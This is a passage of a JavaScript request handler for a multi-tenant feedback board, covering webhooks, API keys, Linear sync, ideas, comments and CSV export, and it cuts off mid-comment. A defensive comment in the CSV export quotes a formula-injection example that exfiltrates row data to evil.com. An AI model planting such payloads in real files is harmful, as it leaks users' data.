        return json({ ok: false, error: err.message }, 502);
      }
    }

    const billingMatch = url.pathname.match(/^\/b\/([a-z0-9-]+)\/billing\/?$/);
    if (request.method === "GET" && billingMatch) {
      const customerSlug = billingMatch[1];
      const isOwner = await requireAuth(request, env, OWNER_SLUG);
      if (!(await requireAuth(request, env, customerSlug))) {
        return new Response(null, {
          status: 302,
          headers: { Location: `/b/${encodeURIComponent(customerSlug)}/login` },
        });
      }
      let currentPlan = "free";
      try {
        const data = await callWorkflow(env, GET_CUSTOMER_PLAN_WORKFLOW_ID, { customerSlug });
        currentPlan = data?.plan || "free";
      } catch {}
      return html(billingPage(customerSlug, currentPlan, isOwner));
    }

    const planMatch = url.pathname.match(/^\/api\/customers\/([a-z0-9-]+)\/plan$/);
    if (request.method === "POST" && planMatch) {
      const customerSlug = planMatch[1];
      if (!(await requireAuth(request, env, customerSlug))) {
        return json({ ok: false, error: "unauthorized" }, 401);
      }
      let body;
      try {
        body = await request.json();
      } catch {
        return json({ ok: false, error: "invalid JSON body" }, 400);
      }
      try {
        const data = await callWorkflow(env, SET_CUSTOMER_PLAN_WORKFLOW_ID, { customerSlug, plan: body.plan });
        return json(data);
      } catch (err) {
        return json({ ok: false, error: err.message }, 502);
      }
    }

    const connectMatch = url.pathname.match(/^\/b\/([a-z0-9-]+)\/connect\/?$/);
    if (request.method === "GET" && connectMatch) {
      const customerSlug = connectMatch[1];
      const isOwner = await requireAuth(request, env, OWNER_SLUG);
      if (!(await requireAuth(request, env, customerSlug))) {
        return new Response(null, {
          status: 302,
          headers: { Location: `/b/${encodeURIComponent(customerSlug)}/login` },
        });
      }
      const endOrgId = await getTenantOrgId(env, customerSlug);
      if (!endOrgId) {
        return html(connectUnavailablePage(customerSlug, isOwner));
      }
      try {
        const token = await mintEmbedToken(env, endOrgId, customerSlug);
        const linkResults = await Promise.allSettled(
          CONNECT_WIDGETS.map(function (w) {
            return createSetupLink(env, w.widgetId, endOrgId, `${customerSlug} - Connect ${w.name}`);
          })
        );
        const setupLinks = {};
        CONNECT_WIDGETS.forEach(function (w, i) {
          const r = linkResults[i];
          setupLinks[w.slug] = r.status === "fulfilled" ? r.value : null;
        });
        return html(connectPage(customerSlug, endOrgId, token, setupLinks, isOwner));
      } catch (err) {
        return html(connectUnavailablePage(customerSlug, isOwner));
      }
    }

    const settingsMatch = url.pathname.match(/^\/b\/([a-z0-9-]+)\/settings\/?$/);
    if (request.method === "GET" && settingsMatch) {
      const customerSlug = settingsMatch[1];
      const isOwner = await requireAuth(request, env, OWNER_SLUG);
      if (!(await requireAuth(request, env, customerSlug))) {
        return new Response(null, {
          status: 302,
          headers: { Location: `/b/${encodeURIComponent(customerSlug)}/login` },
        });
      }
      let settings = {};
      try {
        settings = await callWorkflow(env, GET_CUSTOMER_SETTINGS_WORKFLOW_ID, { customerSlug });
      } catch {}
      return html(settingsPage(customerSlug, settings || {}, url.searchParams.get("saved") === "1", isOwner, url.origin));
    }

    const settingsSaveMatch = url.pathname.match(/^\/api\/customers\/([a-z0-9-]+)\/settings$/);
    if (request.method === "POST" && settingsSaveMatch) {
      const customerSlug = settingsSaveMatch[1];
      if (!(await requireAuth(request, env, customerSlug))) {
        return json({ ok: false, error: "unauthorized" }, 401);
      }
      const contentType = request.headers.get("content-type") || "";
      let slackChannel = "";
      let linearTeamId = "";
      let notionPageId = "";
      let statusLabels = {};
      let linearStateIds = {};
      let categories = [];
      let hiddenRoadmapStatuses = [];
      let autoPromoteVoteThreshold = null;
      if (contentType.includes("application/json")) {
        let body;
        try {
          body = await request.json();
        } catch {
          return json({ ok: false, error: "invalid JSON body" }, 400);
        }
        slackChannel = body.slackChannel || "";
        linearTeamId = body.linearTeamId || "";
        notionPageId = body.notionPageId || "";
        statusLabels = body.statusLabels || {};
        linearStateIds = body.linearStateIds || {};
        categories = Array.isArray(body.categories) ? body.categories : [];
        hiddenRoadmapStatuses = Array.isArray(body.hiddenRoadmapStatuses) ? body.hiddenRoadmapStatuses : [];
        autoPromoteVoteThreshold = body.autoPromoteVoteThreshold || null;
      } else {
        const form = await request.formData();
        slackChannel = form.get("slackChannel") || "";
        linearTeamId = form.get("linearTeamId") || "";
        notionPageId = form.get("notionPageId") || "";
        statusLabels = {
          under_review: form.get("statusLabel_under_review") || "",
          planned: form.get("statusLabel_planned") || "",
          in_progress: form.get("statusLabel_in_progress") || "",
          shipped: form.get("statusLabel_shipped") || "",
          declined: form.get("statusLabel_declined") || "",
        };
        linearStateIds = {
          planned: form.get("linearStateId_planned") || "",
          in_progress: form.get("linearStateId_in_progress") || "",
          shipped: form.get("linearStateId_shipped") || "",
        };
        categories = (form.get("categories") || "").split(",").map((c) => c.trim()).filter(Boolean);
        hiddenRoadmapStatuses = ["under_review", "planned", "in_progress", "shipped", "declined"].filter(
          (key) => form.get(`hideFromRoadmap_${key}`)
        );
        autoPromoteVoteThreshold = form.get("autoPromoteVoteThreshold") || null;
      }
      try {
        await callWorkflow(env, SET_CUSTOMER_SETTINGS_WORKFLOW_ID, {
          customerSlug,
          slackChannel,
          linearTeamId,
          notionPageId,
          statusLabels,
          linearStateIds,
          categories,
          hiddenRoadmapStatuses,
          autoPromoteVoteThreshold,
        });
      } catch (err) {
        return json({ ok: false, error: err.message }, 502);
      }
      if (!contentType.includes("application/json")) {
        return new Response(null, {
          status: 302,
          headers: { Location: `/b/${encodeURIComponent(customerSlug)}/settings?saved=1` },
        });
      }
      return json({ ok: true });
    }

    const destinationsMatch = url.pathname.match(/^\/api\/customers\/([a-z0-9-]+)\/destinations$/);
    if (request.method === "GET" && destinationsMatch) {
      const customerSlug = destinationsMatch[1];
      if (!(await requireAuth(request, env, customerSlug))) {
        return json({ ok: false, error: "unauthorized" }, 401);
      }
      const kind = url.searchParams.get("kind");
      if (!["slack", "linear", "notion", "linear-states"].includes(kind)) {
        return json({ ok: false, error: "kind must be one of slack, linear, notion, linear-states" }, 400);
      }
      const endOrgId = await getTenantOrgId(env, customerSlug);
      if (!endOrgId) {
        return json({ ok: false, error: "no connected workspace for this customer yet" }, 404);
      }
      try {
        const input = kind === "linear-states" ? { kind, teamId: url.searchParams.get("teamId") || "" } : { kind };
        const data = await callWorkflow(env, LIST_DESTINATIONS_WORKFLOW_ID, input, endOrgId);
        return json(data);
      } catch (err) {
        return json({ ok: false, error: err.message }, 502);
      }
    }

    const linearSyncMatch = url.pathname.match(/^\/api\/customers\/([a-z0-9-]+)\/linear-sync$/);
    if (request.method === "POST" && linearSyncMatch) {
      const customerSlug = linearSyncMatch[1];
      if (!(await requireAuth(request, env, customerSlug))) {
        return json({ ok: false, error: "unauthorized" }, 401);
      }
      let body;
      try {
        body = await request.json();
      } catch {
        return json({ ok: false, error: "invalid JSON body" }, 400);
      }
      const endOrgId = await getTenantOrgId(env, customerSlug);
      if (!endOrgId) {
        return json({ ok: false, error: "no connected workspace for this customer yet" }, 404);
      }
      if (body.action === "disable") {
        try {
          const data = await callWorkflow(env, UNREGISTER_LINEAR_WEBHOOK_WORKFLOW_ID, { customerSlug }, endOrgId);
          return json(data);
        } catch (err) {
          return json({ ok: false, error: err.message }, 502);
        }
      }
      if (body.action === "enable") {
        let settings = {};
        try {
          settings = await callWorkflow(env, GET_CUSTOMER_SETTINGS_WORKFLOW_ID, { customerSlug });
        } catch {}
        if (!settings?.linearTeamId) {
          return json({ ok: false, error: "connect a Linear team first" }, 400);
        }
        const secret = toHex(crypto.getRandomValues(new Uint8Array(32)));
        try {
          const data = await callWorkflow(
            env,
            REGISTER_LINEAR_WEBHOOK_WORKFLOW_ID,
            {
              customerSlug,
              teamId: settings.linearTeamId,
              webhookUrl: `${url.origin}/api/webhooks/linear/${encodeURIComponent(customerSlug)}`,
              secret,
            },
            endOrgId
          );
          return json(data);
        } catch (err) {
          return json({ ok: false, error: err.message }, 502);
        }
      }
      return json({ ok: false, error: "action must be 'enable' or 'disable'" }, 400);
    }

    const webhooksMatch = url.pathname.match(/^\/api\/customers\/([a-z0-9-]+)\/webhooks$/);
    if (request.method === "GET" && webhooksMatch) {
      const customerSlug = webhooksMatch[1];
      if (!(await requireAuth(request, env, customerSlug))) {
        return json({ ok: false, error: "unauthorized" }, 401);
      }
      try {
        const data = await callWorkflow(env, LIST_WEBHOOKS_WORKFLOW_ID, { customerSlug });
        return json(data);
      } catch (err) {
        return json({ ok: false, error: err.message }, 502);
      }
    }
    if (request.method === "POST" && webhooksMatch) {
      const customerSlug = webhooksMatch[1];
      if (!(await requireAuth(request, env, customerSlug))) {
        return json({ ok: false, error: "unauthorized" }, 401);
      }
      let body;
      try {
        body = await request.json();
      } catch {
        return json({ ok: false, error: "invalid JSON body" }, 400);
      }
      const webhookUrl = (body.url || "").trim();
      if (!webhookUrl) {
        return json({ ok: false, error: "url is required" }, 400);
      }
      const secret = toHex(crypto.getRandomValues(new Uint8Array(32)));
      try {
        const data = await callWorkflow(env, CREATE_WEBHOOK_WORKFLOW_ID, {
          customerSlug,
          url: webhookUrl,
          events: Array.isArray(body.events) ? body.events : undefined,
          secret,
        });
        return json(data);
      } catch (err) {
        return json({ ok: false, error: err.message }, 502);
      }
    }

    const webhookDeleteMatch = url.pathname.match(/^\/api\/customers\/([a-z0-9-]+)\/webhooks\/(\d+)$/);
    if (request.method === "DELETE" && webhookDeleteMatch) {
      const customerSlug = webhookDeleteMatch[1];
      if (!(await requireAuth(request, env, customerSlug))) {
        return json({ ok: false, error: "unauthorized" }, 401);
      }
      try {
        const data = await callWorkflow(env, DELETE_WEBHOOK_WORKFLOW_ID, { customerSlug, id: Number(webhookDeleteMatch[2]) });
        return json(data);
      } catch (err) {
        return json({ ok: false, error: err.message }, 502);
      }
    }

    const webhookDeliveriesMatch = url.pathname.match(/^\/api\/customers\/([a-z0-9-]+)\/webhooks\/(\d+)\/deliveries$/);
    if (request.method === "GET" && webhookDeliveriesMatch) {
      const customerSlug = webhookDeliveriesMatch[1];
      if (!(await requireAuth(request, env, customerSlug))) {
        return json({ ok: false, error: "unauthorized" }, 401);
      }
      try {
        const data = await callWorkflow(env, LIST_WEBHOOK_DELIVERIES_WORKFLOW_ID, {
          customerSlug,
          webhookId: Number(webhookDeliveriesMatch[2]),
        });
        return json(data);
      } catch (err) {
        return json({ ok: false, error: err.message }, 502);
      }
    }

    const redeliverMatch = url.pathname.match(/^\/api\/customers\/([a-z0-9-]+)\/webhook-deliveries\/(\d+)\/redeliver$/);
    if (request.method === "POST" && redeliverMatch) {
      const customerSlug = redeliverMatch[1];
      if (!(await requireAuth(request, env, customerSlug))) {
        return json({ ok: false, error: "unauthorized" }, 401);
      }
      try {
        const lookup = await callWorkflow(env, GET_WEBHOOK_DELIVERY_WORKFLOW_ID, {
          customerSlug,
          deliveryId: Number(redeliverMatch[2]),
        });
        if (!lookup?.ok || !lookup.delivery) {
          return json({ ok: false, error: lookup?.error || "delivery not found" }, 404);
        }
        const { webhook_id, url: webhookUrl, secret, event_type, payload } = lookup.delivery;
        const status = await sendWebhookAndRecord(env, webhook_id, webhookUrl, secret, event_type, payload);
        return json({ ok: true, status });
      } catch (err) {
        return json({ ok: false, error: err.message }, 502);
      }
    }

    const apiKeyMatch = url.pathname.match(/^\/api\/customers\/([a-z0-9-]+)\/api-key$/);
    if (request.method === "GET" && apiKeyMatch) {
      const customerSlug = apiKeyMatch[1];
      if (!(await requireAuth(request, env, customerSlug))) {
        return json({ ok: false, error: "unauthorized" }, 401);
      }
      try {
        const data = await callWorkflow(env, GET_API_KEY_STATUS_WORKFLOW_ID, { customerSlug });
        return json(data);
      } catch (err) {
        return json({ ok: false, error: err.message }, 502);
      }
    }
    if (request.method === "POST" && apiKeyMatch) {
      const customerSlug = apiKeyMatch[1];
      if (!(await requireAuth(request, env, customerSlug))) {
        return json({ ok: false, error: "unauthorized" }, 401);
      }
      try {
        const rawKey = "rhk_" + toHex(crypto.getRandomValues(new Uint8Array(32)));
        const keyHash = await sha256Hex(rawKey);
        const keyPrefix = rawKey.slice(0, 12) + "...";
        await callWorkflow(env, SET_API_KEY_WORKFLOW_ID, { customerSlug, keyHash, keyPrefix });
        return json({ ok: true, apiKey: rawKey, keyPrefix });
      } catch (err) {
        return json({ ok: false, error: err.message }, 502);
      }
    }
    if (request.method === "DELETE" && apiKeyMatch) {
      const customerSlug = apiKeyMatch[1];
      if (!(await requireAuth(request, env, customerSlug))) {
        return json({ ok: false, error: "unauthorized" }, 401);
      }
      try {
        await callWorkflow(env, SET_API_KEY_WORKFLOW_ID, { customerSlug, keyHash: "", keyPrefix: "" });
        return json({ ok: true });
      } catch (err) {
        return json({ ok: false, error: err.message }, 502);
      }
    }

    const linearWebhookMatch = url.pathname.match(/^\/api\/webhooks\/linear\/([a-z0-9-]+)$/);
    if (request.method === "POST" && linearWebhookMatch) {
      const customerSlug = linearWebhookMatch[1];
      const rawBody = await request.text();
      const signature = request.headers.get("linear-signature") || "";

      let secret = null;
      try {
        const secretData = await callWorkflow(env, GET_LINEAR_WEBHOOK_SECRET_WORKFLOW_ID, { customerSlug });
        secret = secretData?.secret || null;
      } catch {}
      if (!secret || !(await verifyLinearWebhookSignature(secret, rawBody, signature))) {
        return json({ ok: false, error: "invalid signature" }, 401);
      }

      let payload;
      try {
        payload = JSON.parse(rawBody);
      } catch {
        return json({ ok: false, error: "invalid JSON body" }, 400);
      }

      // Linear expects a fast 200 ack - every branch below that isn't a bad
      // signature returns ok even when there's nothing to do, so a retry storm
      // from Linear's side never happens because we 4xx/5xx on no-op events.
      if (payload.type !== "Issue" || !payload.data?.id) {
        return json({ ok: true, skipped: "not an issue event" });
      }

      let settings = {};
      try {
        settings = await callWorkflow(env, GET_CUSTOMER_SETTINGS_WORKFLOW_ID, { customerSlug });
      } catch {}

      // The customer's exact per-status state pick (Settings) is authoritative
      // when configured - a team's other same-type states (its own internal
      // in-between steps) are then invisible to RequestHub entirely. Only
      // falls back to "any state of this type" for customers who haven't
      // configured pickers yet.
      const incomingStateId = payload.data?.state?.id;
      const stateIdToStatus = {};
      for (const status of ["planned", "in_progress", "shipped"]) {
        const id = settings?.linearStateIds?.[status];
        if (id) stateIdToStatus[id] = status;
      }
      const stateType = payload.data?.state?.type;
      const mappedStatus = stateIdToStatus[incomingStateId] || LINEAR_STATE_TYPE_TO_STATUS[stateType];
      if (!mappedStatus) {
        return json({ ok: true, skipped: "no forward status mapping for state type " + stateType });
      }

      try {
        const found = await callWorkflow(env, FIND_IDEA_BY_LINEAR_ISSUE_WORKFLOW_ID, {
          customerSlug,
          linearIssueId: payload.data.id,
        });
        if (!found?.found) {
          return json({ ok: true, skipped: "no matching idea for this Linear issue" });
        }
        if (mappedStatus === found.currentStatus) {
          return json({ ok: true, skipped: "status already matches" });
        }

        const endOrgId = await getTenantOrgId(env, customerSlug);
        const data = await callWorkflow(
          env,
          UPDATE_STATUS_WORKFLOW_ID,
          {
            ideaId: found.ideaId,
            status: mappedStatus,
            linearTeamId: settings?.linearTeamId || DEFAULT_LINEAR_TEAM_ID,
            notionPageId: settings?.notionPageId || DEFAULT_NOTION_PAGE_ID,
            // This status change originated in Linear - pushing it back would
            // just be echoing Linear's own state back at itself.
            syncToLinearState: false,
            baseUrl: url.origin,
          },
          endOrgId
        );
        if (data?.idea) {
          deliverWebhooks(env, ctx, customerSlug, "idea.status_changed", data.idea);
        }
        return json({ ok: true, data });
      } catch (err) {
        return json({ ok: false, error: err.message }, 502);
      }
    }

    if (request.method === "GET" && url.pathname === "/api/ideas") {
      const customerSlug = url.searchParams.get("customer") || "demo";
      const statusFilter = url.searchParams.get("status");
      const categoryFilter = url.searchParams.get("category");
      try {
        const data = await callWorkflow(env, LIST_WORKFLOW_ID, { customerSlug });
        let ideas = data?.ideas || [];
        if (statusFilter && STATUSES.includes(statusFilter)) {
          ideas = ideas.filter(function (i) { return i.status === statusFilter; });
        }
        if (categoryFilter) {
          ideas = ideas.filter(function (i) { return i.category === categoryFilter; });
        }
        let statusLabels = null;
        let categories = null;
        let hiddenRoadmapStatuses = [];
        try {
          const settings = await callWorkflow(env, GET_CUSTOMER_SETTINGS_WORKFLOW_ID, { customerSlug });
          statusLabels = settings?.statusLabels || null;
          categories = settings?.categories || null;
          hiddenRoadmapStatuses = settings?.hiddenRoadmapStatuses || [];
        } catch {}
        let commentsByIdea = null;
        if (url.searchParams.get("includeComments") === "1") {
          try {
            const commentsData = await callWorkflow(env, LIST_SEARCHABLE_COMMENTS_WORKFLOW_ID, { customerSlug });
            commentsByIdea = commentsData?.commentsByIdea || {};
          } catch {}
        }
        return json({ ...data, ideas, statusLabels, categories, hiddenRoadmapStatuses, commentsByIdea });
      } catch (err) {
        return json({ ok: false, error: err.message, ideas: [] }, 502);
      }
    }

    if (request.method === "POST" && url.pathname === "/api/ideas") {
      let body;
      try {
        body = await request.json();
      } catch {
        return json({ ok: false, error: "invalid JSON body" }, 400);
      }
      const submitCustomerSlug = body.customerSlug || "demo";
      try {
        const endOrgId = await getTenantOrgId(env, submitCustomerSlug);
        let slackChannel;
        try {
          const settings = await callWorkflow(env, GET_CUSTOMER_SETTINGS_WORKFLOW_ID, { customerSlug: submitCustomerSlug });
          slackChannel = settings?.slackChannel || undefined;
        } catch {}
        const data = await callWorkflow(
          env,
          SUBMIT_WORKFLOW_ID,
          {
            customerSlug: submitCustomerSlug,
            title: body.title,
            description: body.description || "",
            category: body.category || "Feature",
            submitterEmail: body.submitterEmail || "",
            tags: Array.isArray(body.tags) ? body.tags : [],
            ...(slackChannel ? { slackChannel } : {}),
          },
          endOrgId
        );
        if (data?.idea) {
          deliverWebhooks(env, ctx, submitCustomerSlug, "idea.created", data.idea);
        }
        return json(data);
      } catch (err) {
        return json({ ok: false, error: err.message }, 502);
      }
    }

    const voteMatch = url.pathname.match(/^\/api\/ideas\/(\d+)\/vote$/);
    if (request.method === "POST" && voteMatch) {
      let voteBody = {};
      try {
        voteBody = await request.json();
      } catch {
        voteBody = {};
      }
      const { voterKey, setCookie } = getOrCreateVoterKey(request);
      try {
        const data = await callWorkflow(env, VOTE_WORKFLOW_ID, {
          ideaId: Number(voteMatch[1]),
          direction: voteBody.direction === "down" ? "down" : "up",
          voterKey,
        });
        if (data?.ok && voteBody.direction !== "down" && data.idea) {
          const promotedIdea = await maybeAutoPromote(env, ctx, url.origin, data.idea);
          if (promotedIdea !== data.idea) {
            data.idea = promotedIdea;
            data.autoPromoted = true;
          }
        }
        return json(data, 200, setCookie ? { "set-cookie": setCookie } : {});
      } catch (err) {
        return json({ ok: false, error: err.message }, 502);
      }
    }

    const subscribeMatch = url.pathname.match(/^\/api\/ideas\/(\d+)\/subscribe$/);
    if (request.method === "POST" && subscribeMatch) {
      let body;
      try {
        body = await request.json();
      } catch {
        return json({ ok: false, error: "invalid JSON body" }, 400);
      }
      const email = (body.email || "").trim();
      if (!email) {
        return json({ ok: false, error: "email is required" }, 400);
      }
      try {
        const unsubscribeToken = toHex(crypto.getRandomValues(new Uint8Array(24)));
        const data = await callWorkflow(env, SUBSCRIBE_TO_IDEA_WORKFLOW_ID, {
          ideaId: Number(subscribeMatch[1]),
          email,
          unsubscribeToken,
        });
        return json(data);
      } catch (err) {
        return json({ ok: false, error: err.message }, 502);
      }
    }

    const statusHistoryMatch = url.pathname.match(/^\/api\/ideas\/(\d+)\/history$/);
    if (request.method === "GET" && statusHistoryMatch) {
      try {
        const data = await callWorkflow(env, LIST_STATUS_HISTORY_WORKFLOW_ID, { ideaId: Number(statusHistoryMatch[1]) });
        return json(data);
      } catch (err) {
        return json({ ok: false, error: err.message, history: [] }, 502);
      }
    }

    const commentsMatch = url.pathname.match(/^\/api\/ideas\/(\d+)\/comments$/);
    if (request.method === "GET" && commentsMatch) {
      const viewerCustomerSlug = (url.searchParams.get("customer") || "").trim();
      const isTeamViewer = viewerCustomerSlug ? await requireAuth(request, env, viewerCustomerSlug) : false;
      try {
        const data = await callWorkflow(env, LIST_COMMENTS_WORKFLOW_ID, {
          ideaId: Number(commentsMatch[1]),
          includeInternal: isTeamViewer,
        });
        return json(data);
      } catch (err) {
        return json({ ok: false, error: err.message, comments: [] }, 502);
      }
    }
    if (request.method === "POST" && commentsMatch) {
      let body;
      try {
        body = await request.json();
      } catch {
        return json({ ok: false, error: "invalid JSON body" }, 400);
      }
      const commentCustomerSlug = (body.customerSlug || "").trim();
      const isTeam = commentCustomerSlug ? await requireAuth(request, env, commentCustomerSlug) : false;
      try {
        const data = await callWorkflow(env, ADD_COMMENT_WORKFLOW_ID, {
          ideaId: Number(commentsMatch[1]),
          authorName: body.authorName || "Anonymous",
          authorEmail: body.authorEmail || "",
          body: body.body,
          isTeam,
          internal: isTeam && Boolean(body.internal),
          ideaUrl: isTeam ? `${url.origin}/b/${encodeURIComponent(commentCustomerSlug)}/ideas/${commentsMatch[1]}` : "",
          baseUrl: isTeam ? url.origin : "",
        });
        if (data?.ok && data.comment && !data.comment.internal && data.customerSlug) {
          deliverWebhooks(env, ctx, data.customerSlug, "comment.created", {
            ...data.comment,
            idea_id: Number(commentsMatch[1]),
          });
        }
        return json(data);
      } catch (err) {
        return json({ ok: false, error: err.message }, 502);
      }
    }

    const exportMatch = url.pathname.match(/^\/api\/customers\/([a-z0-9-]+)\/export\.csv$/);
    if (request.method === "GET" && exportMatch) {
      const customerSlug = exportMatch[1];
      if (!(await requireAuth(request, env, customerSlug))) {
        return json({ ok: false, error: "unauthorized" }, 401);
      }
      try {
        const data = await callWorkflow(env, LIST_WORKFLOW_ID, { customerSlug });
        const ideas = data?.ideas || [];
        // Formula/CSV injection (CWE-1236): title, description, category, and
        // tags are all free-text an anonymous public submitter controls. If a
        // cell's content starts with =, +, -, or @ (or a tab/CR), Excel/
        // Sheets/LibreOffice treat it as a formula when the admin opens this
        // export - e.g. a title of =HYPERLINK("http://evil.com/?"&A2,"...")
        // would exfiltrate that row's other data the moment the file is
        // opened. Prefixing with a single quote is the standard mitigation
        // (OWASP's CSV injection cheat sheet): spreadsheet apps treat a
        // leading ' as "force this cell to plain text" and don't display it.
        const csvEscape = (v) => {
          let s = String(v ?? "");
          if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
          return '"' + s.replace(/"/g, '""') + '"';
        };
        const header = ["id", "title", "description", "category", "status", "votes", "tags", "is_pinned", "submitter_email", "linear_issue_url", "created_at"];
        const rows = ideas.map((i) => header.map((k) => csvEscape(i[k])).join(","));
        const csv = [header.join(","), ...rows].join("\r\n");
        return new Response(csv, {
          headers: {
            "content-type": "text/csv; charset=utf-8",
            "content-disposition": `attachment; filename="${customerSlug}-ideas.csv"`,
          },
        });
      } catch (err) {
        return json({ ok: false, error: err.message }, 502);
      }
    }

    const deleteIdeaMatch = url.pathname.match(/^\/api\/ideas\/(\d+)$/);
    if (request.method === "DELETE" && deleteIdeaMatch) {
      let body;
      try {
        body = await request.json();
      } catch {
        body = {};
      }
      const deleteCustomerSlug = (body.customerSlug || "").trim();
      if (!deleteCustomerSlug) {
        return json({ ok: false, error: "customerSlug is required" }, 400);
      }
      if (!(await requireAuth(request, env, deleteCustomerSlug))) {
        return json({ ok: false, error: "unauthorized" }, 401);
      }
      try {
        const data = await callWorkflow(env, DELETE_IDEA_WORKFLOW_ID, {
          ideaId: Number(deleteIdeaMatch[1]),
          customerSlug: deleteCustomerSlug,
        });
        return json(data);
      } catch (err) {
        return json({ ok: false, error: err.message }, 502);
      }
    }

    const statusMatch = url.pathname.match(/^\/api\/ideas\/(\d+)\/status$/);
    if (request.method === "POST" && statusMatch) {
      let body;
      try {
        body = await request.json();
      } catch {
        return json({ ok: false, error: "invalid JSON body" }, 400);
      }
      if (!STATUSES.includes(body.status)) {
        return json({ ok: false, error: "status must be one of " + STATUSES.join(", ") }, 400);
      }
      const statusCustomerSlug = (body.customerSlug || "").trim();
      if (!statusCustomerSlug) {
        return json({ ok: false, error: "customerSlug is required" }, 400);
      }
      if (!(await requireAuth(request, env, statusCustomerSlug))) {
        return json({ ok: false, error: "unauthorized" }, 401);
      }
      try {
        const listData = await callWorkflow(env, LIST_WORKFLOW_ID, { customerSlug: statusCustomerSlug });
        const belongs = (listData?.ideas || []).some((i) => i.id === Number(statusMatch[1]));
        if (!belongs) {
          return json({ ok: false, error: "idea not found for this customer" }, 404);
        }
      } catch (err) {
        return json({ ok: false, error: err.message }, 502);
      }
      try {
        const endOrgId = await getTenantOrgId(env, statusCustomerSlug);
        let settings = {};
        try {
          settings = await callWorkflow(env, GET_CUSTOMER_SETTINGS_WORKFLOW_ID, { customerSlug: statusCustomerSlug });
        } catch {}
        const data = await callWorkflow(
          env,
          UPDATE_STATUS_WORKFLOW_ID,
          {
            ideaId: Number(statusMatch[1]),
            status: body.status,
            linearTeamId: body.linearTeamId || settings?.linearTeamId || DEFAULT_LINEAR_TEAM_ID,
            notionPageId: body.notionPageId || settings?.notionPageId || DEFAULT_NOTION_PAGE_ID,
            linearStateIds: settings?.linearStateIds || {},
            baseUrl: url.origin,
          },
          endOrgId
        );
        if (data?.idea) {
          deliverWebhooks(env, ctx, statusCustomerSlug, "idea.status_changed", data.idea);
        }
        return json(data);
      } catch (err) {
        return json({ ok: false, error: err.message }, 502);
      }
    }

    const pinMatch = url.pathname.match(/^\/api\/ideas\/(\d+)\/pin$/);
    if (request.method === "POST" && pinMatch) {
      let body;
      try {
        body = await request.json();
      } catch {
        return json({ ok: false, error: "invalid JSON body" }, 400);
      }
      const pinCustomerSlug = (body.customerSlug || "").trim();
      if (!pinCustomerSlug) {
        return json({ ok: false, error: "customerSlug is required" }, 400);
      }
      if (!(await requireAuth(request, env, pinCustomerSlug))) {
        return json({ ok: false, error: "unauthorized" }, 401);
      }
      try {
        const listData = await callWorkflow(env, LIST_WORKFLOW_ID, { customerSlug: pinCustomerSlug });
        const belongs = (listData?.ideas || []).some((i) => i.id === Number(pinMatch[1]));
        if (!belongs) {
          return json({ ok: false, error: "idea not found for this customer" }, 404);
        }
        const data = await callWorkflow(env, SET_IDEA_PINNED_WORKFLOW_ID, {
          ideaId: Number(pinMatch[1]),
          pinned: Boolean(body.pinned),
        });
        return json(data);
      } catch (err) {
        return json({ ok: false, error: err.message }, 502);
      }
    }

    const tagsMatch = url.pathname.match(/^\/api\/ideas\/(\d+)\/tags$/);
    if (request.method === "POST" && tagsMatch) {
      let body;
      try {
        body = await request.json();
      } catch {
        return json({ ok: false, error: "invalid JSON body" }, 400);
      }
      const tagsCustomerSlug = (body.customerSlug || "").trim();
      if (!tagsCustomerSlug) {
        return json({ ok: false, error: "customerSlug is required" }, 400);
      }
      if (!(await requireAuth(request, env, tagsCustomerSlug))) {
        return json({ ok: false, error: "unauthorized" }, 401);
      }
      try {
        const listData = await callWorkflow(env, LIST_WORKFLOW_ID, { customerSlug: tagsCustomerSlug });
        const belongs = (listData?.ideas || []).some((i) => i.id === Number(tagsMatch[1]));
        if (!belongs) {
          return json({ ok: false, error: "idea not found for this customer" }, 404);
        }
        const data = await callWorkflow(env, SET_IDEA_TAGS_WORKFLOW_ID, {
          ideaId: Number(tagsMatch[1]),
          customerSlug: tagsCustomerSlug,
          tags: Array.isArray(body.tags) ? body.tags : [],
        });
        return json(data);
      } catch (err) {
        return json({ ok: false, error: err.message }, 502);
      }
    }

    const mergeMatch = url.pathname.match(/^\/api\/ideas\/(\d+)\/merge$/);
    if (request.method === "POST" && mergeMatch) {
      let body;
      try {
        body = await request.json();
      } catch {
        return json({ ok: false, error: "invalid JSON body" }, 400);
      }
      const mergeCustomerSlug = (body.customerSlug || "").trim();
      const canonicalId = Number(body.canonicalId);
      if (!mergeCustomerSlug) {
        return json({ ok: false, error: "customerSlug is required" }, 400);
      }
      if (!canonicalId) {
        return json({ ok: false, error: "canonicalId is required" }, 400);
      }
      if (!(await requireAuth(request, env, mergeCustomerSlug))) {
        return json({ ok: false, error: "unauthorized" }, 401);
      }
      try {
        const duplicateId = Number(mergeMatch[1]);
        const listData = await callWorkflow(env, LIST_WORKFLOW_ID, { customerSlug: mergeCustomerSlug });
        const ids = new Set((listData?.ideas || []).map((i) => i.id));
        if (!ids.has(duplicateId) || !ids.has(canonicalId)) {
          return json({ ok: false, error: "both ideas must belong to this customer" }, 404);
        }
        const data = await callWorkflow(env, MERGE_IDEAS_WORKFLOW_ID, {
          duplicateId,
          canonicalId,
          customerSlug: mergeCustomerSlug,
          baseUrl: url.origin,
        });
        if (data?.ok) {
          deliverWebhooks(env, ctx, mergeCustomerSlug, "idea.merged", {
            duplicate: data.duplicate,
            canonical: data.canonical,
          });
          // The canonical idea's votes just jumped by the duplicate's count
          // in one step, not one vote at a time - without this, an idea that
          // the merge itself pushes over the customer's threshold would sit
          // there until some future human vote happened to check it again.
          if (data.canonical) {
            const promotedCanonical = await maybeAutoPromote(env, ctx, url.origin, data.canonical);
            if (promotedCanonical !== data.canonical) {
              data.canonical = promotedCanonical;
              data.canonicalAutoPromoted = true;
            }
          }
        }
        return json(data);
      } catch (err) {
        return json({ ok: false, error: err.message }, 502);
      }
    }

    const mergeStatusMatch = url.pathname.match(/^\/api\/ideas\/(\d+)\/merge-status$/);
    if (request.method === "GET" && mergeStatusMatch) {
      const mergeStatusCustomerSlug = (url.searchParams.get("customer") || "").trim();
      if (!mergeStatusCustomerSlug) {
        return json({ ok: false, error: "customer is required" }, 400);
      }
      try {
        const data = await callWorkflow(env, GET_IDEA_RAW_WORKFLOW_ID, {
          ideaId: Number(mergeStatusMatch[1]),
          customerSlug: mergeStatusCustomerSlug,
        });
        return json(data);
      } catch (err) {
        return json({ ok: false, error: err.message }, 502);
      }
    }

    // Partner API (v1) - authenticated with a per-tenant Bearer API key
    // instead of the admin session cookie, so a customer's own backend can
    // integrate without a human logging in. The tenant is derived entirely
    // from the key; a caller can never act on a customerSlug other than its
